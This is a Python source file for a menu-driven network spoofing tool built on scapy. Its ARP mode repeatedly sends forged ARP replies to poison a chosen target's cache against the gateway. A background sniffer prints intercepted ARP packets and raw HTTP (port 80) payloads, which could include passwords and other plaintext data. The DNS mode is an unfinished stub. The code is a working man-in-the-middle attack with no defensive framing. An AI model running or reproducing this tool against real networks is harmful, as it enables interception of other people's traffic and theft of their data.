import socket
import os
import sys
from scapy.all import ARP, Ether, sendp, sniff, srp
import threading
import time

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m"

def spoof():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.YELLOW + """
  _____                    __ 
 / ____|                  / _|
| (___  _ __   ___   ___ | |_ 
 \___ \| '_ \ / _ \ / _ \|  _|
 ____) | |_) | (_) | (_) | |  
|_____/| .__/ \___/ \___/|_|  
       | |                    
       |_|                                     

-- version 1.0 --
-- spoofing menu --

 -- usage --         
 >> arp 
 >> dns
 >> exit
          
    """ + TextColors.RESET)

    while True:
        select = input(TextColors.YELLOW + ">> " + TextColors.RESET)

        if select.lower() == "arp":
            def get_mac(ip):
                arp_request = ARP(op=1, pdst=ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = broadcast / arp_request
                answered_list = srp(packet, timeout=1, verbose=False)[0]

                for sent, received in answered_list:
                    return received.hwsrc
                return None

            def arp_spoof(target_ip, spoof_ip, iface):
                target_mac = get_mac(target_ip)

                if not target_mac:
                    print(TextColors.RED + f"[-] NOT FOUND MAC ADDRESS {target_ip}" + TextColors.RESET)
                    return

                ether = Ether(dst=target_mac)
                arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=ether.src)
                packet = ether / arp
                sendp(packet, iface=iface, verbose=False)

                print(f"[*] {target_ip:<15} MAC {target_mac:<17} ARP {spoof_ip}")

            def sniffer_callback(packet):
                if packet.haslayer(ARP):
                    arp_src = packet[ARP].psrc
                    arp_dst = packet[ARP].pdst
                    arp_mac = packet[ARP].hwsrc
                    arp_op = packet[ARP].op

                    if arp_op == 1:  
                        print(f"[+] {arp_dst:<15} MAC {arp_mac:<17} ARP {arp_src}")
                    elif arp_op == 2:  
                        print(f"[*] {arp_src:<15} MAC {arp_mac:<17} ARP {arp_dst}")

                if packet.haslayer('IP') and packet.haslayer('TCP'):
                    if packet['TCP'].dport == 80: 
                        if packet.haslayer('Raw'):
                            raw_data = bytes(packet['Raw']).decode(errors='ignore')
                            print(TextColors.YELLOW + f"[*] {packet['IP'].src}  [+] HTTP {packet['IP'].dst} {raw_data}" + TextColors.RESET)
                        else:
                            print(TextColors.YELLOW + f"[*] {packet['IP'].src}  [+] HTTP {packet['IP'].dst}" + TextColors.RESET)

            def packet_sniffer(iface):
                sniff(prn=sniffer_callback, filter="arp or tcp port 80", store=0, iface=iface)

            def start_spoofing():
                target_ip = input(TextColors.YELLOW + "[+] TARGET IP : " + TextColors.RESET)
                gateway = input(TextColors.YELLOW + "[+] GATEWAY : " + TextColors.RESET)
                iface = input(TextColors.YELLOW + "[*] INTERFACE : " + TextColors.RESET)

                print(TextColors.BOLD + f"    {'IP Address':<20} {'MAC Address':<20} {'Status'}" + TextColors.RESET)
                print("=" * 60)

                sniffer_thread = threading.Thread(target=packet_sniffer, args=(iface,))
                sniffer_thread.start()

                try:
                    while True:
                        arp_spoof(target_ip, gateway, iface)
                        time.sleep(5)
                except KeyboardInterrupt:
                    print(TextColors.CYAN + "[-] STOP ARP SPOOFING." + TextColors.RESET)
                    input()

            start_spoofing()

        elif select.lower() == "dns":
            print("Coming soon...")
            input()

        elif select.lower() == "exit":
            print(TextColors.CYAN + "[+] NetHunter EXIT..." + TextColors.RESET)
            sys.exit()






    



        


    
